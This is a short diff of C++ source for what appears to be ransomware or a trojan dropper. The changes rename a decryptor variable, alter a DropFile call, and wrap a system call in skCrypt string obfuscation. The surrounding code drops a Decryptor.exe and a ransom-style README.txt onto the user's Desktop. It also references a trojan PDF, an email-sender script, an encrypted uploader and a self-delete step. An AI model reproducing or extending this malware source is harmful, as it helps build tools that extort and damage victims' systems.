@@ -6,7 +6,7 @@ using namespace std;
 string WallpaperContent = "./wallpaper.jpg";
 string FileIconContent = "./ICON.ico";
 string EmailSenderContent = "./emailSender.ps1";
-string InfoDecryptorContent = "../x64/Release/DataDecryptor.exe";
+string DataDecryptorContent = "../x64/Release/DataDecryptor.exe";
 string CustomFileContent = "../x64/Release/debugFolder_backup/exe_example.exe";
 string TrojanFileContent = "../x64/Release/debugFolder_backup/pdfsample.pdf";
 
@@ -227,12 +227,12 @@ int main(int argc, char* argv[]) {
 
     // drop decryptor.exe
 #if DROP_DECRYPTOR
-    DropFile(InfoDecryptorContent, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
+    DropFile(DataDecryptorContent, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
 #endif
 
     // drop README.txt
 #if DROP_README
-    DropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt"));
+    DropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt"), false);
 #endif
 
     // drop custom file
@@ -257,7 +257,7 @@ int main(int argc, char* argv[]) {
 #if FILE_UPLOADER
     cout << skCrypt("Links:\n") << aes_decrypt(KEY, links_txt, IV) << skCrypt("\n");
 #endif
-    system("pause");
+    system(skCrypt("pause"));
 #endif
 
     // self delete
